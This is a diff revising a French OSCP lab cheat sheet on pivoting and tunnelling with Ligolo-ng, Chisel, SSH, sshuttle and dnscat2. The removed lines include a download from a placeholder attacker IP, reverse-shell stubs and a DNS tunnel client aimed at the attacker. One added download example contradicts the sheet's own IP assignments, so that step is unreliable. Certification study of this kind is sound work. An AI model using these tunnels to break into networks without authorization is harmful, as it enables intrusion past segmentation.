@@ -1,622 +1,445 @@
 ---
-title: "OSCP · Tunneling"
-description: "Référence des outils de tunnel et des modes de transport réseau."
+title: "OSCP · Tunnels et pivot réseau"
+description: "Ligolo-ng pas à pas, double pivot, listeners, Chisel et SSH."
 ---
 
-# OSCP · Tunneling
+# Tunnels et pivot réseau
 
-Référence des outils de tunnel et des modes de transport réseau.
+**Objectif :** atteindre un réseau interne depuis Kali en passant par une machine de pivot. Le **proxy Ligolo-ng** tourne sur Kali ; l'**agent** tourne sur la machine qui peut voir le réseau interne. Le trajet se fait par un tunnel chiffré.
 
+**Adresses fictives à remplacer :** Kali `10.10.14.10` · premier pivot Windows `10.10.10.30` (IP interne `172.16.20.1`) · réseau interne `172.16.20.0/24` · deuxième pivot `172.16.20.30` · second réseau `172.16.30.0/24`.
 
-### Tunnel simple
+Chaque bloc précise **où exécuter la commande**. Une commande saisie **dans la console Ligolo** n'est pas une commande Bash ou PowerShell.
 
-Configurer et comprendre les chemins de communication réseau.
+## Avant de commencer
 
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_tunnel.png)
+Télécharger les binaires depuis les [versions officielles de Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) : **proxy** pour Kali, **agent** pour Windows/Linux et pour l'architecture concernée. Dans cette fiche, les binaires sont renommés `proxy`, `agent` ou `agent.exe` et placés dans le répertoire courant. Prévoir un compte capable de créer une interface TUN sur Kali, mais l'agent n'a pas besoin des droits administrateur.
 
+**Ne pas oublier :** le proxy et l'agent doivent être compatibles. Vérifier les options disponibles localement avec `./proxy -h` et `./agent -h` (ou `agent.exe -h` sur Windows).
 
-**Paramètres et repères :**
-`X.X.X.X` · `Y.Y.Y.Y` · `X.X.X.X/` · `255.255.255.0`  
-`/24`  
+## Ligolo-ng : premier tunnel
 
+**Ordre à suivre :** préparer l'interface → lancer le proxy sur Kali → récupérer l'empreinte TLS → connecter l'agent depuis Windows/Linux → sélectionner la session → démarrer le tunnel → ajouter la route → tester.
 
-<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
+### Préparer l'interface TUN sur Kali
 
-```bash
-sudo ip tuntap add user [kali_user] mode tun ligolo
+L'interface TUN transporte les paquets vers Ligolo. Ne pas la recréer si elle existe déjà. Cette méthode manuelle fonctionne avec les versions classiques.
 
-sudo ip link set ligolo up
-
-```
-
-
-<p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>
-
-```bash
-# -selfcert génère un certificat TLS autosigné. Le tunnel reste chiffré, mais il faut vérifier l'identité du serveur.
-./ligolo_proxy_linux -selfcert
-# Autre possibilité
-./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
-
-```
-
-
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
-
-```powershell
-iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
-
-```
-
-
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Tunnel simple ».</p>
-
-```powershell
-# Le port est le port par défaut, nous pourrions également le modifier si nécessaire.
-./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
-# Autre possibilité
-./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert
-
-```
-
-
-<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
-
-```bash
-# Exécutez cette commande dans un autre terminal que depuis celui où le proxy ligolo est exécuté
-sudo ip route add [internal_submask]/24 dev ligolo
-
-# Vérifier la table de routage
-ip route list
-
-```
-
-
-<p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>
-
-```bash
-# Exécutez ces commandes dans le terminal proxy ligolo
-» session
-» start
-
-# Après cela, le tunnel devrait être prêt, vous pourriez exécuter n'importe quelle commande.
-
-```
-
-
-
-#### Vérifier le routage avant un tunnel
-
-Contrôler la route réellement choisie pour joindre une adresse du laboratoire.
-
-<p class="oscp-command-note">Vérifier le routage avant un tunnel.</p>
-
-```bash
-ip route get <IP_CIBLE>
-ss -ltnp
-```
-
-#### Saut SSH (ProxyJump)
-
-Rejoindre un serveur final à travers un hôte SSH intermédiaire autorisé.
-
-<p class="oscp-command-note">Saut SSH (ProxyJump).</p>
-
-```bash
-ssh -J <UTILISATEUR_PIVOT>@<IP_PIVOT> <UTILISATEUR_CIBLE>@<IP_CIBLE>
-```
-
-### Double tunnel
-
-Configurer et comprendre les chemins de communication réseau.
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)
-
-
-<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
-
-```bash
-sudo ip tuntap add user [kali_user] mode tun ligolo_double
-
-sudo ip link set ligolo_double up
-
-```
-
-
-<p class="oscp-command-note">Script shell dans la rubrique « Double tunnel ».</p>
-
-```bash
-# La prochaine étape est d'ajouter un auditeur sur le port 11601 à notre session Ligolo existante et de la rediriger vers notre machine.
-listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
-
-# Vérifiez qu'il a été ajouté
-listener_list
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)
-
-
-
-
-```powershell
-# Ensuite, nous devons exécuter l'agent sur l'hôte Windows pour se connecter au port transmis sur notre machine d'attaque
-./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_02.png)
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_03.png)
-
-
-<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
-
-```bash
-# Notre dernière étape est de changer notre session en deuxième point de pivot (Windows), de démarrer le tunnel, puis d'ajouter une route au réseau nouvellement découvert à 10.1.30.0/24.
-sudo ip add route <New_Network> dev ligolo_double
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_04.png)
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_05.png)
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_06.png)
-
-
-### Redirection locale de ports (Local Port Forwarding)
-
-Vérifier les ports et les services de la cible autorisée.
-
-
-<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
-
-```bash
-# Ajoutez une IP spéciale codée en dur pour le transfert de port local.
-sudo ip route add 240.0.0.1/32 dev ligolo
-
-```
-
-
-**Paramètres et repères :**
-`240.0.0.1/32`  
-
-
-
-
-```text
-dev ligolo
-
-```
-
-
-**Paramètres et repères :**
-`240.0.0.1`  
-
-
-<p class="oscp-command-note">Script shell dans la rubrique « Local Redirection de ports ».</p>
-
-```bash
-┌──(kali㉿Kali)-[~]  
-└─$ nmap 240.0.0.1 -sV
-
-PORT STATE SERVICE VERSION  
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
-80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
-631/tcp open ipp CUPS 2.2  
-3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1  
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)
-
-
-
-#### Tunnel local lié à la boucle locale
-
-Rendre accessible un port distant depuis un port de la machine locale, sans l'exposer sur toutes les interfaces.
-
-<p class="oscp-command-note">Tunnel local lié à la boucle locale.</p>
-
-```bash
-ssh -N -L 127.0.0.1:<PORT_LOCAL>:<IP_SERVICE>:<PORT_DISTANT> <UTILISATEUR>@<PIVOT_SSH>
-```
-
-#### Tunnel dynamique SOCKS
-
-Créer un proxy SOCKS local pour l'acheminement d'applications compatibles.
-
-<p class="oscp-command-note">Tunnel dynamique SOCKS.</p>
-
-```bash
-ssh -N -D 127.0.0.1:9050 <UTILISATEUR>@<PIVOT_SSH>
-```
-
-### Shells inversés depuis les réseaux internes (Reverse Shells)
-
-
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
-
-```bash
-nc -nvlp [kali_port]
-
-```
-
-
-
-
-```bash
-listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_10.png)
-
-
-**Paramètres et repères :**
-`msfvenom`  
-
-
-
-
-```bash
-[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
-# Autre possibilité
-./payload.exe
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_11.png)
-
-
-### Transfert de fichiers depuis les réseaux internes
-
-Transférer ou récupérer des fichiers dans le laboratoire.
-
-
-
-
-```bash
-listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)
-
-
-<p class="oscp-command-note">Exécuter un script Python.</p>
-
-```bash
-python3 -m http.server [kali_port]
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)
-
-
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
-
-```powershell
-Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]
-
-```
-
-![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_09.png)
-
-
-## Tunnels HTTP avec Chisel
-
-Examiner les entrées et les réponses de l'application web.
-
-
-### Redirection de ports
-
-Vérifier les ports et les services de la cible autorisée.
-
-
-<p class="oscp-command-note">Configurer un tunnel réseau.</p>
-
-```bash
-# In remote machine
-chisel server -p <listen-port>
-
-# In local machine
-chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
-
-```
-
-
-### Redirection inversée de ports
-
-Vérifier les ports et les services de la cible autorisée.
-
-
-<p class="oscp-command-note">Configurer un tunnel réseau.</p>
-
-```bash
-# In local machine
-chisel server -p <LOCAL_PORT> --reverse
-
-# In remote machine
-chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>
-
-# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, <LOCAL_FORWARD_PORT> avec le port de votre machine locale auquel le service distant sera transmis, <REMOTE_IP> avec l'adresse IP de la machine distante, et <REMOTE_PORT> avec le port de la machine distante.
-
-```
-
-
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
-
-```bash
-curl http://localhost:<LOCAL_FORWARD_PORT>
-
-# Le résultat est le contenu de http://<REMOTE_IP>:<REMOTE_PORT>/
-
-```
-
-
-### Proxy SOCKS dynamique
-
-Configurer et comprendre les chemins de communication réseau.
-
-
-<p class="oscp-command-note">Configurer un tunnel réseau.</p>
-
-```bash
-# In remote
-chisel server -p <REMOTE_PORT> --socks5
-
-# In local
-chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
-
-# Remplacer <REMOTE_PORT> par le port du proxy SOCKS sur la machine distante, <REMOTE_IP> par l'adresse IP de la machine distante, et <LOCAL_PORT> par le port de votre machine locale où le proxy SOCKS sera disponible.
-
-```
-
-
-**Paramètres et repères :**
-`/etc/proxychains.conf`  
-
-
-<p class="oscp-command-note">Script shell dans la rubrique « Proxy SOCKS dynamique ».</p>
-
-```bash
-# Comment out the line of "socks4"
-
-# /etc/proxychains.conf
-...
-socks5 127.0.0.1 <LOCAL_PORT>
-
-```
-
-
-
-#### Tester une connexion via SOCKS
-
-Confirmer que le proxy relaie une requête en utilisant la résolution DNS côté proxy.
-
-<p class="oscp-command-note">Tester une connexion via SOCKS.</p>
-
-```bash
-curl --socks5-hostname 127.0.0.1:9050 -I 'http://<HOTE_INTERNE>/'
-```
-
-#### Utiliser un proxy avec Nmap
-
-Nmap derrière proxychains nécessite un scan TCP connect : certaines sondes et découvertes hôtes ne passent pas par SOCKS.
-
-<p class="oscp-command-note">Utiliser un proxy avec Nmap.</p>
-
-```bash
-proxychains4 -q nmap -sT -Pn -n -p <PORTS> <IP_CIBLE>
-```
-
-### Proxy SOCKS inverse
-
-Configurer et comprendre les chemins de communication réseau.
-
-
-<p class="oscp-command-note">Configurer un tunnel réseau.</p>
-
-```bash
-# In local machine
-chisel server -p <LOCAL_PORT> --reverse
-
-# In remote machine
-chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
-
-# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, et <REMOTE_PORT> avec le port sur la machine distante où le proxy SOCKS sera disponible.
-
-```
-
-
-**Paramètres et repères :**
-`/etc/proxychains.conf`  
-
-
-
-
-```bash
-# /etc/proxychains.conf
-...
-socks5 127.0.0.1 <REMOTE_PORT>
-
-```
-
-
-<p class="oscp-command-note">Utiliser une commande au travers d&#x27;un proxy.</p>
-
-```bash
-proxychains nmap localhost
-
-```
-
-
-
-### Démarrer le serveur Chisel
-
-Écouter sur le port de relais choisi ; l'authentification et le chiffrement doivent être définis selon l'environnement.
-
-<p class="oscp-command-note">Démarrer le serveur Chisel.</p>
-
-```bash
-chisel server --reverse --port 8080
-```
-
-### Ouvrir une redirection TCP Chisel
-
-Exposer un port cible à travers la connexion Chisel établie.
-
-<p class="oscp-command-note">Ouvrir une redirection TCP Chisel.</p>
-
-```bash
-chisel client <IP_SERVEUR>:8080 R:<PORT_LOCAL>:127.0.0.1:<PORT_CIBLE>
-```
-
-## Tunnels DNS avec dnscat2
-
-Interroger les enregistrements DNS et identifier les services associés.
-
-
-**Paramètres et repères :**
-`dnscat2`  
-
-
-
-
-```bash
-# Remplacer [domain] par le domaine choisi
-dnscat2-server [domain]
-
-```
-
-
-**Paramètres et repères :**
-`dnscat2`  
-
-
-<p class="oscp-command-note">Script shell dans la rubrique « Dnscat2 (DNS Tunneling) ».</p>
-
-```bash
-# Avec domaine
-./dnscat --secret=[secret] [domain]
-
-# Directly to server
-./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]
-
-```
-
-
-**Paramètres et repères :**
-`dnscat2`  
-
-
-
-
-```bash
-dnscat2> windows
-dnscat2> window -i [session_id]
-
-```
-
-
-**Paramètres et repères :**
-`dnscat2`  
-
-
-
-
-```bash
-command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]
-
-```
-
-
-**Paramètres et repères :**
-`dnscat2`  
-
-
-<p class="oscp-command-note">Parcourir un partage SMB.</p>
-
-```bash
-# Exemple de commande
-smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]
-
-```
-
-
-## Pivot réseau : Ligolo-ng et sshuttle
-
-Ligolo-ng relaie le trafic via une interface TUN, tandis que sshuttle route certains flux par SSH. Limiter les routes aux sous-réseaux autorisés et vérifier les paramètres de la version installée.
-
-### Créer une interface TUN
-
-Configurer l'interface locale qui recevra les paquets destinés au réseau distant.
-
-<p class="oscp-command-note">Créer une interface TUN.</p>
+<p class="oscp-command-note">Sur Kali — terminal habituel, avant de lancer le proxy.</p>
 
 ```bash
 sudo ip tuntap add user "$USER" mode tun ligolo
+sudo ip link set ligolo up
+ip -br link show ligolo
 ```
 
-### Démarrer le proxy Ligolo-ng
+### Démarrer le proxy sur Kali
 
-Le proxy écoute les connexions de l'agent. Un certificat autosigné reste approprié au laboratoire si son empreinte est vérifiée.
+Les exemples utilisent un binaire nommé `proxy` téléchargé depuis le projet officiel. Ligolo écoute par défaut sur TCP 11601.
 
-<p class="oscp-command-note">Démarrer le proxy Ligolo-ng.</p>
+<p class="oscp-command-note">Sur Kali — autre terminal, à laisser ouvert.</p>
 
 ```bash
-./proxy -selfcert -laddr 0.0.0.0:11601
+chmod +x ./proxy
+./proxy -selfcert
 ```
 
-### Connecter l'agent par empreinte
+### Lire l'empreinte du certificat
 
-Employer une empreinte SHA-256 vérifiée plutôt que désactiver entièrement la validation TLS.
+Copier l'empreinte SHA-256 affichée : elle permettra à l'agent de vérifier qu'il se connecte au bon proxy.
 
-<p class="oscp-command-note">Connecter l'agent par empreinte.</p>
+<p class="oscp-command-note">Dans la console interactive du proxy Ligolo sur Kali.</p>
+
+```text
+certificate_fingerprint
+```
+
+### Connecter un agent Windows
+
+Transférer auparavant le binaire Windows `agent.exe` de la même version que le proxy. Remplacer `EMPREINTE_SHA256` par la vraie empreinte.
+
+<p class="oscp-command-note">Sur le Windows pivot — PowerShell.</p>
+
+```powershell
+.\agent.exe -connect 10.10.14.10:11601 -accept-fingerprint EMPREINTE_SHA256
+```
+
+### Connecter un agent Linux
+
+Alternative à l'agent Windows. Exécuter le binaire Linux correspondant à l'architecture du pivot.
+
+<p class="oscp-command-note">Sur un pivot Linux — terminal Bash.</p>
 
 ```bash
-./agent -connect <IP_PROXY>:11601 -accept-fingerprint <EMPREINTE_SHA256>
+chmod +x ./agent
+./agent -connect 10.10.14.10:11601 -accept-fingerprint EMPREINTE_SHA256
 ```
 
-### Démarrer le tunnel dans la console proxy
+### Choisir l'agent et repérer son réseau
 
-Sélectionner la session appropriée, puis attacher le tunnel à l'interface TUN configurée.
+`session` affiche les agents connectés : choisir celui qui doit servir de pivot. `ifconfig` montre les interfaces du pivot et leurs réseaux.
 
-<p class="oscp-command-note">Démarrer le tunnel dans la console proxy.</p>
+<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>
+
+```text
+session
+ifconfig
+```
+
+### Démarrer le tunnel sur l'interface
+
+`ligolo` est le nom de l'interface TUN créée sur Kali.
+
+<p class="oscp-command-note">Dans la console Ligolo, **après avoir sélectionné la session**.</p>
 
 ```text
 tunnel_start --tun ligolo
+tunnel_list
 ```
 
-### Ajouter une route vers le réseau d'audit
+### Ajouter la route du réseau interne
 
-Router uniquement la plage IP requise à travers l'interface ligolo.
+Adapter `172.16.20.0/24` au réseau découvert avec `ifconfig` dans Ligolo. Cette route n'est ajoutée que sur Kali.
 
-<p class="oscp-command-note">Ajouter une route vers le réseau d'audit.</p>
+<p class="oscp-command-note">Sur Kali — terminal Linux différent de la console proxy.</p>
 
 ```bash
-sudo ip route add <RESEAU_CIBLE_CIDR> dev ligolo
+sudo ip route add 172.16.20.0/24 dev ligolo
+ip route get 172.16.20.10
 ```
 
-### Route réseau avec sshuttle
+### Tester un service du réseau interne
 
-L'accès SSH au pivot doit être opérationnel avant de créer ce routage.
+Tester d'abord un service précis. Ligolo n'exige pas ProxyChains pour les réseaux routés par son interface. `--unprivileged` réduit le risque de faux positifs liés aux sondes brutes de Nmap.
 
-<p class="oscp-command-note">Route réseau avec sshuttle.</p>
+<p class="oscp-command-note">Sur Kali — terminal Linux.</p>
 
 ```bash
-sshuttle -r <UTILISATEUR>@<PIVOT_SSH> <RESEAU_CIBLE_CIDR>
+nmap -sT -Pn -n --unprivileged -p 80,445,3389 172.16.20.10
+curl -I --max-time 5 http://172.16.20.10/
 ```
 
-**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md). Synthèse rédigée pour SKILL-ISSUE.
+**À savoir :** l'agent Ligolo peut fonctionner sans droits administrateur, mais Kali doit pouvoir créer l'interface TUN. Pour Nmap, commencer par `-sT -Pn`, puis adapter au contexte ; Ligolo traduit certaines sondes TCP en appels `connect()` côté pivot.
 
-<!-- notes-krovs-2026 -->
+## Autre façon de créer l'interface (Ligolo récent)
 
----
+Depuis Ligolo-ng **v0.6**, la console du proxy permet de créer l'interface et d'ajouter la route. **Choisir cette méthode OU la préparation manuelle précédente, pas les deux**. La création requiert les permissions réseau suffisantes sur Kali.
 
-Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+### Créer l'interface dans la console Ligolo
 
-<!-- refined-oscp -->
+La console tente de créer l'interface TUN sur le système Kali.
+
+<p class="oscp-command-note">Dans la console Ligolo sur Kali — alternative aux commandes `ip tuntap`.</p>
+
+```text
+interface_create --name ligolo
+```
+
+### Ajouter la route depuis la console
+
+Cette commande remplace `sudo ip route add` pour un client compatible ; le sous-réseau doit être celui du pivot.
+
+<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>
+
+```text
+interface_add_route --name ligolo --route 172.16.20.0/24
+```
+
+Ensuite, sélectionner l'agent avec `session`, démarrer avec `tunnel_start --tun ligolo` et tester le routage. Dans les versions récentes, les interfaces et routes peuvent être conservées dans la configuration du proxy.
+
+## Atteindre le localhost du pivot
+
+**Problème :** un service sur `127.0.0.1:8000` du pivot n'est pas accessible directement via son IP réseau. Ligolo réserve `240.0.0.1` pour atteindre **le `127.0.0.1` de l'agent sélectionné** à travers son tunnel.
+
+### Ajouter la route spéciale vers le localhost distant
+
+Cette route doit utiliser l'interface de l'agent concerné.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux.</p>
+
+```bash
+sudo ip route add 240.0.0.1/32 dev ligolo
+curl -I http://240.0.0.1:8000/
+```
+
+La réponse HTTP n'existe que si un serveur écoute réellement sur le port `8000` du pivot. Éviter de réutiliser cette même adresse avec plusieurs interfaces simultanées sans contrôler la route.
+
+## Ligolo-ng : double pivot
+
+**Situation :** Kali atteint le premier pivot, mais le deuxième pivot **ne peut pas joindre directement Kali**. Le premier pivot doit relayer le port Ligolo du deuxième agent vers le proxy sur Kali.
+
+```text
+Kali (proxy :11601) ⇐ tunnel TLS ⇒ Pivot A (agent Ligolo)
+                                       ↑ connexion de Pivot B vers A:11602
+                                       │ listener A → Kali:11601
+                                 Pivot B (deuxième agent) → réseau 172.16.30.0/24
+```
+
+### Créer un listener sur le premier pivot
+
+Le port `11602` est ouvert **sur le pivot A** et redirigé vers `127.0.0.1:11601` **sur Kali**. Ne pas le confondre avec un port ouvert sur Kali.
+
+<p class="oscp-command-note">Dans la console Ligolo, **session du pivot A** sélectionnée.</p>
+
+```text
+listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
+listener_list
+```
+
+### Faire connecter le second agent
+
+Pivot B contacte l'IP de Pivot A, pas celle de Kali. Vérifier que Pivot B peut joindre le port 11602 du premier pivot.
+
+<p class="oscp-command-note">Sur le pivot B — PowerShell si Windows.</p>
+
+```powershell
+.\agent.exe -connect 172.16.20.1:11602 -accept-fingerprint EMPREINTE_SHA256
+```
+
+**Attention à l'IP ci-dessus :** `172.16.20.1` est l'adresse interne du premier pivot A, tandis que `172.16.20.30` est celle du deuxième pivot B. Remplacer ces IP par les vraies interfaces trouvées avec `ifconfig`.
+
+### Créer la seconde interface TUN
+
+Chaque tunnel actif doit avoir sa propre interface ; `ligolo2` est distincte de `ligolo`.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux habituel.</p>
+
+```bash
+sudo ip tuntap add user "$USER" mode tun ligolo2
+sudo ip link set ligolo2 up
+```
+
+### Sélectionner le deuxième agent
+
+Sélectionner la **nouvelle** session apparue pour Pivot B, puis démarrer le deuxième tunnel.
+
+<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>
+
+```text
+session
+ifconfig
+tunnel_start --tun ligolo2
+```
+
+### Router le deuxième réseau
+
+Le second sous-réseau passe par `ligolo2`, pas `ligolo`.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux.</p>
+
+```bash
+sudo ip route add 172.16.30.0/24 dev ligolo2
+ip route get 172.16.30.10
+nmap -sT -Pn -n -p 445 172.16.30.10
+```
+
+## Listener Ligolo : rendre un service Kali accessible au pivot
+
+Un *listener* est une **redirection de port sur l'agent Ligolo** vers un port qui écoute **sur Kali**. Pratique pour récupérer un fichier depuis Kali lorsque la cible ne peut pas contacter directement `10.10.14.10`.
+
+### Héberger le fichier sur Kali
+
+Servir un dossier uniquement sur `127.0.0.1:8000` ; le listener Ligolo assurera l'accès distant.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux séparé.</p>
+
+```bash
+mkdir -p ./partage
+python3 -m http.server 8000 --bind 127.0.0.1 --directory ./partage
+```
+
+### Exposer ce service sur le pivot A
+
+Le port `8080` écoute sur le **pivot A** et redirige vers le HTTP de Kali (`127.0.0.1:8000`).
+
+<p class="oscp-command-note">Dans la console Ligolo — session du pivot A.</p>
+
+```text
+listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
+listener_list
+```
+
+### Télécharger depuis une machine interne
+
+Ici `172.16.20.1` est **l'IP interne du pivot A** visible de cette machine, et le fichier existe dans `./partage/` sur Kali.
+
+<p class="oscp-command-note">Sur Windows interne pouvant joindre l'IP réseau du pivot A.</p>
+
+```powershell
+Invoke-WebRequest -UseBasicParsing -Uri 'http://172.16.20.30:8080/outil.txt' -OutFile 'C:\Users\Public\outil.txt'
+```
+
+Pour **envoyer un fichier vers Kali**, ce serveur HTTP Python ne suffit pas : utiliser **SMB ou WebDAV** comme expliqué dans la [fiche Transferts de fichiers](./transferts.md). Un listener Ligolo peut acheminer ces protocoles si le port et le service de réception sont configurés.
+
+## Chisel : autre solution de pivot
+
+**Chisel** transporte des redirections TCP et un proxy SOCKS dans une connexion client/serveur. Contrairement au tunnel TUN de Ligolo, il peut nécessiter ProxyChains pour les outils qui ne prennent pas en charge SOCKS.
+
+### Démarrer Chisel en mode reverse
+
+Kali écoute sur TCP `8001` et accepte les redirections inverses demandées par le client distant.
+
+<p class="oscp-command-note">Sur Kali — serveur Chisel.</p>
+
+```bash
+chisel server --port 8001 --reverse
+```
+
+### Rediriger un port interne vers Kali
+
+Le port `8080` sur Kali pointe vers le port `80` du pivot Windows.
+
+<p class="oscp-command-note">Sur le pivot Windows — client Chisel.</p>
+
+```powershell
+.\chisel.exe client 10.10.14.10:8001 R:8080:127.0.0.1:80
+```
+
+### Tester le port redirigé
+
+La connexion aboutit sur le serveur HTTP du pivot, s'il existe.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux distinct.</p>
+
+```bash
+curl -I http://127.0.0.1:8080/
+```
+
+### Créer un proxy SOCKS inversé
+
+Le port SOCKS `1080` apparaîtra sur Kali. Garder la commande ouverte pendant l'utilisation.
+
+<p class="oscp-command-note">Sur le pivot Windows — client Chisel.</p>
+
+```powershell
+.\chisel.exe client 10.10.14.10:8001 R:1080:socks
+```
+
+### Tester un site interne via SOCKS
+
+`--socks5-hostname` demande la résolution du nom côté proxy, utile pour les noms internes.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux.</p>
+
+```bash
+curl --socks5-hostname 127.0.0.1:1080 -I http://172.16.20.10/
+```
+
+**ProxyChains :** si l'outil n'accepte pas SOCKS directement, ajouter `socks5 127.0.0.1 1080` à la section `[ProxyList]` du fichier `/etc/proxychains4.conf`, puis préfixer la commande par `proxychains4`. Dans Nmap, privilégier `-sT -Pn` derrière un proxy SOCKS.
+
+## SSH : alternative simple avec un compte valide
+
+**Quand utiliser SSH ?** Lorsque le pivot possède déjà un serveur SSH et que vous avez des identifiants autorisés. Pour les transferts de fichiers, utiliser [SCP](./transferts.md).
+
+### Redirection SSH locale
+
+Le port `8080` local dirige le trafic vers `172.16.20.10:80` depuis l'hôte SSH.
+
+<p class="oscp-command-note">Sur Kali — le serveur SSH a accès au service interne.</p>
+
+```bash
+ssh -N -L 127.0.0.1:8080:172.16.20.10:80 etudiant@10.10.10.30
+```
+
+### Proxy SOCKS par SSH
+
+Un proxy SOCKS local apparaît sur le port `9050` de Kali.
+
+<p class="oscp-command-note">Sur Kali — accès SSH à un pivot.</p>
+
+```bash
+ssh -N -D 127.0.0.1:9050 etudiant@10.10.10.30
+```
+
+### Routage réseau avec sshuttle
+
+Acheminer le sous-réseau entier par le pivot, sans installer un agent Ligolo.
+
+<p class="oscp-command-note">Sur Kali — sshuttle et SSH accessibles.</p>
+
+```bash
+sshuttle -r etudiant@10.10.10.30 172.16.20.0/24
+```
+
+## Tunnel DNS avec dnscat2
+
+Alternative avancée, réservée au laboratoire dont les échanges DNS sont autorisés. **Ce n'est pas une étape nécessaire pour Ligolo-ng** : elle est conservée séparément pour éviter de mélanger les outils.
+
+### Démarrer le serveur dnscat2
+
+Remplacer le domaine par un domaine appartenant au laboratoire et définir un secret partagé.
+
+<p class="oscp-command-note">Sur la machine Linux qui héberge le serveur DNS contrôlé.</p>
+
+```bash
+dnscat2-server laboratoire.example --secret 'SecretDeTest'
+```
+
+### Connecter un client dnscat2
+
+Utiliser le domaine et le secret correspondants ; la résolution DNS doit parvenir au serveur.
+
+<p class="oscp-command-note">Sur le client Linux de laboratoire.</p>
+
+```bash
+./dnscat --secret='SecretDeTest' laboratoire.example
+```
+
+La disponibilité et les options de `dnscat2` dépendent de l'installation. Exécuter `dnscat2-server --help` et `./dnscat --help` pour la version locale.
+
+## Dépannage Ligolo-ng
+
+| Symptôme | Cause à vérifier |
+|---|---|
+| L'agent n'apparaît pas | Proxy en écoute ? IP Kali correcte ? TCP 11601 joignable ? |
+| Empreinte TLS refusée | Copier l'empreinte exacte du proxy avec `certificate_fingerprint` |
+| `no such device` / TUN absent | Créer l'interface et vérifier `ip -br link` sur Kali |
+| `RTNETLINK answers: File exists` | La route existe déjà ; consulter `ip route` avant de la modifier |
+| Tunnel lancé mais réseau inaccessible | Mauvaise session, mauvais sous-réseau, pare-feu ou route locale absente |
+| Second agent non connecté | Le listener est ouvert sur le bon **premier pivot**, et joignable depuis le second ? |
+| Réseau local de l'agent inaccessible | Utiliser `240.0.0.1/32` pour son `127.0.0.1` avec la bonne interface |
+| Port redirigé muet | Vérifier le vrai service sur Kali et l'adresse `--to` du listener |
+
+
+## Arrêter et nettoyer
+
+### Fermer le tunnel
+
+Arrêter le tunnel sélectionné. Les listeners sont indépendants : les fermer aussi si nécessaire.
+
+<p class="oscp-command-note">Dans la console Ligolo — sélectionner la bonne session.</p>
+
+```text
+session
+tunnel_stop
+listener_list
